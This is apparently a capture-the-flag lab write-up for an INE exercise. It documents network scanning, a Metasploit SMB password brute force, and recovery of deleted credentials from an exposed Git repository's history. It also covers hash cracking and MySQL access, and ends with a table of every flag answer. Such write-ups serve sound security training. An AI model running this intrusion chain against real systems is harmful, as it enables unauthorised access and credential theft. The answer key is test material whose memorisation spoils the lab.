# INE Skill Dive --- Exploring a Git Repo

> **Platform:** INE Skill Dive\
> **Category:** Network Pentesting: Git\
> **Status:** ✅ Completed --- 9/9 Flags\
> **Target:** `evilcorp.com` --- `192.51.205.3`

------------------------------------------------------------------------

## 🎯 Lab Objective

The objective of this lab is to interact with an SMB server, access a
shared project repository, investigate the exposed Git metadata, and
recover information that was removed from the current version of the
project.

The lab covers:

-   Network reconnaissance
-   SMB enumeration and authentication
-   SMB share access
-   Git branch and commit analysis
-   Recovery of redacted information from Git history
-   SQLite database investigation
-   Password hash cracking with John the Ripper
-   MySQL authentication and database enumeration

The lab walkthrough notes that IP addresses and domain names can differ
between lab instances, so the commands below use the IP from my
completed lab: `192.51.205.3`.

------------------------------------------------------------------------

# 1. Network Discovery

## 1.1 Check the local IP address

``` bash
ip a
```

**What it does:**\
Displays the network interfaces, IP addresses, MAC addresses, and
interface status of the Kali machine.

My attacker IP was:

``` text
192.51.205.2/24
```

This placed the target on the `192.51.205.0/24` network.

------------------------------------------------------------------------

## 1.2 Scan the network

``` bash
nmap 192.51.205.0/24
```

**What it does:**\
Scans the `/24` network to discover live hosts and identify commonly
used TCP services.

The target discovered was:

``` text
evilcorp.com (192.51.205.3)
```

Important open ports:

``` text
139/tcp   open   netbios-ssn
445/tcp   open   microsoft-ds
3306/tcp  open   mysql
```

### Why these ports matter

-   **139/445** → SMB/Windows file-sharing services
-   **3306** → MySQL database server

The lab walkthrough identifies SMB and MySQL as the important services
on the target.

------------------------------------------------------------------------

# 2. SMB Enumeration

## 2.1 Try anonymous SMB access

``` bash
smbclient -L //192.51.205.3 -N
```

**What it does:**\
Attempts to list SMB shares using anonymous authentication.

Result:

``` text
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

This showed that anonymous authentication was accepted, but share
enumeration was denied.

Because authenticated SMB access was needed, the next step was to
identify the password for the `jeremy` user.

------------------------------------------------------------------------

# 3. Discover Jeremy's SMB Password

Start Metasploit:

``` bash
msfconsole
```

**What it does:**\
Launches the Metasploit Framework console.

Load the SMB login scanner:

``` text
use auxiliary/scanner/smb/smb_login
```

**What it does:**\
Selects Metasploit's SMB login scanner module.

Set the SMB username:

``` text
set SMBUser jeremy
```

**What it does:**\
Tells the module to test passwords for the `jeremy` SMB account.

Set the target:

``` text
set RHOSTS 192.51.205.3
```

**What it does:**\
Specifies the target host to scan.

Set the password wordlist:

``` text
set PASS_FILE /root/Desktop/wordlists/100-common-passwords.txt
```

**What it does:**\
Provides a list of candidate passwords for the SMB login attempts.

Run the module:

``` text
run
```

**What it does:**\
Starts the SMB login attempts using the configured username, target, and
password list.

Successful result:

``` text
Success: '.\jeremy:raspberry'
```

Therefore:

``` text
Username: jeremy
Password: raspberry
```

------------------------------------------------------------------------

# 4. Access the SMB Share

Connect to the `corp_code` share:

``` bash
smbclient //192.51.205.3/corp_code -U jeremy%raspberry
```

**What it does:**\
Connects to the `corp_code` SMB share using Jeremy's credentials.

List the directory:

``` text
ls
```

**What it does:**\
Lists files and directories in the current SMB location.

The important directory was:

``` text
webapp-code
```

Enter it:

``` text
cd webapp-code
```

**What it does:**\
Changes the current SMB directory to `webapp-code`.

List its contents:

``` text
ls
```

The important discovery was:

``` text
.git
django_web_app
_config.yml
Screenshots
LICENSE
README.md
```

------------------------------------------------------------------------

# 5. Identify the Exposed Git Repository

The `.git` directory was visible inside the SMB share.

``` text
.git
```

**Why it matters:**\
The `.git` directory contains repository metadata, including commit
history, branches, references, and previous versions of files.

This is particularly important because information removed from the
current source code may still exist in earlier Git commits.

------------------------------------------------------------------------

# 6. Download the Repository

Inside `smbclient`, configure the download:

``` text
mask ""
```

**What it does:**\
Clears the current filename mask so files are not unnecessarily
restricted.

``` text
recurse ON
```

**What it does:**\
Enables recursive downloading of files inside subdirectories.

``` text
prompt OFF
```

**What it does:**\
Disables confirmation prompts for every file during `mget`.

``` text
lcd /tmp/webapp-code
```

**What it does:**\
Changes the local directory where downloaded files will be stored.

``` text
mget *
```

**What it does:**\
Downloads all matching files and directories from the current SMB
location.

The repository was downloaded to:

``` text
/tmp/webapp-code
```

Exit SMB:

``` text
exit
```

**What it does:**\
Closes the SMB client session and returns to the normal Kali shell.

------------------------------------------------------------------------

# 7. Verify the Downloaded Repository

Move to the downloaded repository:

``` bash
cd /tmp/webapp-code
```

**What it does:**\
Changes the local working directory to the downloaded Git repository.

List all files, including hidden files:

``` bash
ls -la
```

**What it does:**\
Displays normal and hidden files. The `-a` option is important because
`.git` is hidden.

The repository contained:

``` text
.git
LICENSE
README.md
Screenshots
_config.yml
django_web_app
```

Inspect the Git metadata:

``` bash
ls .git
```

**What it does:**\
Lists the files and directories inside Git's metadata directory.

------------------------------------------------------------------------

# 8. Enumerate Git Branches

``` bash
git branch
```

**What it does:**\
Displays the local branches in the Git repository. The branch marked
with `*` is the current branch.

The repository contained four branches:

``` text
development
master
new_product
production
```

Therefore:

``` text
Number of Git branches: 4
```

------------------------------------------------------------------------

# 9. Identify the Current Branch

Again:

``` bash
git branch
```

Example:

``` text
  development
  master
* new_product
  production
```

The `*` identifies the current branch.

Therefore:

``` text
Current branch: new_product
```

You can also inspect the commit history:

``` bash
git log
```

**What it does:**\
Displays the commit history of the current branch.

Git's `HEAD` points to the current checkout/branch.

------------------------------------------------------------------------

# 10. Identify the User Who Committed to `new_product`

View the branch history:

``` bash
git log new_product
```

**What it does:**\
Displays commits belonging to the `new_product` branch.

To display only the author name and email:

``` bash
git log new_product --format="%an <%ae>"
```

**What it does:**\
Formats the Git log to show the author name (`%an`) and author email
(`%ae`).

The author was:

``` text
Bob Willson <bob.willson@dev.evilcorp.com>
```

Therefore:

``` text
User: Bob Willson
Email: bob.willson@dev.evilcorp.com
```

------------------------------------------------------------------------

# 11. Count Project Contributors

``` bash
git shortlog -s
```

**What it does:**\
Creates a summarized list of contributors and their commit counts.

The project had:

``` text
5 contributors
```

This command is also useful for seeing how many commits each contributor
made.

------------------------------------------------------------------------

# 12. Find the User Who Removed Sensitive Information

Inspect the Git history:

``` bash
git log
```

**What it does:**\
Displays commit history, including commit authors and commit messages.

The repository contained commits indicating that sensitive information
had been redacted.

The user responsible was:

``` text
Kevin Williams
```

Email:

``` text
kev.will@devops.evilcorp.com
```

Useful commands for inspecting the relevant changes were:

``` bash
git show 028877801b74d9ed6e94f11bb416d74341c49524
```

and:

``` bash
git show 6713e3a7096fd90b53783f3d8398ffb9a82b130a
```

**What `git show` does:**\
Displays the details and file changes introduced by a specific commit.

------------------------------------------------------------------------

# 13. Recover the SQLite Database from Git History

Inspect only the development branch:

``` bash
git log development
```

**What it does:**\
Shows the commit history for the `development` branch.

One commit indicated:

``` text
Database containing sensitive creds redacted from dev branch
```

This suggested that the database existed in an earlier commit.

Checkout the earlier commit:

``` bash
git checkout c2ec29626731c484c932174fb6be47823de214d4
```

**What it does:**\
Moves the working tree to the specified historical Git commit.

Locate the database:

``` bash
ls
```

and:

``` bash
ls django_web_app/
```

The database was:

``` text
db.sqlite3
```

------------------------------------------------------------------------

# 14. Inspect SQLite

Open the database:

``` bash
sqlite3 django_web_app/db.sqlite3
```

**What it does:**\
Starts the SQLite command-line interface and opens the specified
database.

List the database tables:

``` sql
.tables
```

**What it does:**\
Displays the tables available in the SQLite database.

Inspect the user table:

``` sql
.schema evilcorp_userbase
```

**What it does:**\
Displays the SQL schema for the `evilcorp_userbase` table, including its
columns and data types.

The password values were stored as hashes.

Exit SQLite:

``` sql
.quit
```

**What it does:**\
Closes the SQLite session and returns to the normal shell.

------------------------------------------------------------------------

# 15. Crack Tom's Password

Save Tom's password hash into:

``` text
hash.txt
```

Display it:

``` bash
cat hash.txt
```

**What it does:**\
Prints the contents of the hash file so it can be verified before
cracking.

Run John the Ripper:

``` bash
john hash.txt
```

**What it does:**\
Attempts to recover the plaintext password from the supplied password
hash using John the Ripper.

Recovered password:

``` text
pineapple
```

Therefore:

``` text
Tom's password: pineapple
```

------------------------------------------------------------------------

# 16. Recover MySQL Credentials

Switch to the production branch:

``` bash
git checkout production
```

**What it does:**\
Switches the working tree to the `production` branch.

View the production branch history:

``` bash
git log production
```

**What it does:**\
Displays commits belonging to the production branch.

The history contained messages indicating that the database credentials
had been redacted from `settings.py`.

Checkout the earlier commit:

``` bash
git checkout eb7fd4ef70af68933e9fb98fb09dc07b0bb5ce41
```

**What it does:**\
Restores the repository to an earlier version where the production
settings contained the database credentials.

Inspect the Django settings file:

``` bash
cat django_web_app/django_web_app/settings.py
```

**What it does:**\
Prints the Django application's settings file to the terminal.

The recovered MySQL credentials were:

``` text
Username: admin
Password: %$@!#RFJ(#$(refw23r5tan3t54d04m!#@
```

> **Security lesson:** Database passwords should never be hardcoded into
> source code or committed to a Git repository.

------------------------------------------------------------------------

# 17. Connect to MySQL

Use the interactive password prompt:

``` bash
mysql -u admin -h evilcorp.com -P 3306 -p
```

**What it does:**

-   `-u admin` → specifies the MySQL username
-   `-h evilcorp.com` → specifies the MySQL server
-   `-P 3306` → specifies port 3306
-   `-p` → asks for the password interactively

Using `-p` without putting the password directly in the command is
useful when the password contains shell-special characters.

------------------------------------------------------------------------

# 18. Enumerate MySQL Databases

After connecting:

``` sql
show databases;
```

**What it does:**\
Lists the databases available to the authenticated MySQL user.

The relevant database was:

``` text
secret_flag
```

Select it:

``` sql
use secret_flag;
```

**What it does:**\
Changes the current MySQL database to `secret_flag`.

List its tables:

``` sql
show tables;
```

**What it does:**\
Displays the tables available in the currently selected database.

The relevant table was:

``` text
flag
```

------------------------------------------------------------------------

# 19. Retrieve the Final Flag

Run:

``` sql
select * from flag;
```

**What it does:**\
Retrieves all columns and rows from the `flag` table.

The final flag was:

``` text
8e4ce0a6ce69575a4aa5acd5
```

------------------------------------------------------------------------

# 🚩 Flags Captured

  --------------------------------------------------------------------------------------
  \#                      Lab Question            Answer
  ----------------------- ----------------------- --------------------------------------
  1                       SMB password for        `raspberry`
                          `jeremy`                

  2                       Number of Git branches  `4`

  3                       Current Git branch      `new_product`

  4                       Only user to commit to  `Bob Willson`
                          `new_product`           

  5                       Number of project       `5`
                          contributors            

  6                       Email of user who       `kev.will@devops.evilcorp.com`
                          removed sensitive       
                          information             

  7                       Password of `tom` from  `pineapple`
                          SQLite                  

  8                       MySQL database password `%$@!#RFJ(#$(refw23r5tan3t54d04m!#@`

  9                       Flag in MySQL           `8e4ce0a6ce69575a4aa5acd5`
  --------------------------------------------------------------------------------------

------------------------------------------------------------------------

# 🧠 Key Lessons

## 1. Exposed `.git` directories are dangerous

A web or SMB-accessible `.git` directory can expose:

-   Branches
-   Commit history
-   Previous source code
-   Deleted files
-   Configuration files
-   Credentials
-   Developer information

## 2. Deleted secrets can remain in Git history

Removing a password from the latest version does not automatically
remove it from older commits.

The attack path in this lab was essentially:

``` text
Current source
     ↓
.git exposed
     ↓
Git history
     ↓
Older commit
     ↓
Redacted credential
     ↓
Database access
```

## 3. Hardcoded credentials are a security risk

The production Django settings contained MySQL credentials. Secrets
should instead be stored using appropriate secret-management mechanisms
or environment variables and should not be committed to source control.

## 4. Multiple weaknesses can be chained

The complete lab chain was:

``` text
Nmap
  ↓
SMB
  ↓
Jeremy credentials
  ↓
SMB share
  ↓
Exposed Git repository
  ↓
Git history
  ├── SQLite credentials
  └── MySQL credentials
          ↓
      MySQL database
          ↓
       Final flag
```

------------------------------------------------------------------------

# 🏁 Lab Completion

**Exploring a Git Repo --- ✅ 9/9 Flags Captured**

This lab demonstrated how SMB access, exposed Git metadata, historical
commits, weak credential handling, SQLite password hashes, and database
credentials can be chained together during a controlled
penetration-testing exercise.

## Quick Command Reference

``` bash
# Network discovery
ip a
nmap 192.51.205.0/24

# SMB
smbclient -L //192.51.205.3 -N
smbclient //192.51.205.3/corp_code -U jeremy%raspberry

# Download repository (inside smbclient)
mask ""
recurse ON
prompt OFF
lcd /tmp/webapp-code
mget *
exit

# Git investigation
cd /tmp/webapp-code
ls -la
git branch
git log
git log new_product
git log new_product --format="%an <%ae>"
git shortlog -s
git show <commit>

# Git history recovery
git log development
git checkout <older-commit>

# SQLite
sqlite3 django_web_app/db.sqlite3
.tables
.schema evilcorp_userbase
.quit

# Password cracking
cat hash.txt
john hash.txt

# Production Git history
git checkout production
git log production
git checkout <older-commit>
cat django_web_app/django_web_app/settings.py

# MySQL
mysql -u admin -h evilcorp.com -P 3306 -p

# MySQL enumeration
show databases;
use secret_flag;
show tables;
select * from flag;
```

------------------------------------------------------------------------

## References

The walkthrough supplied with the lab was used as the primary reference
for the commands and workflow. It notes that it is a reference rather
than a comprehensive solution and that lab IP addresses/domain names may
differ between instances.
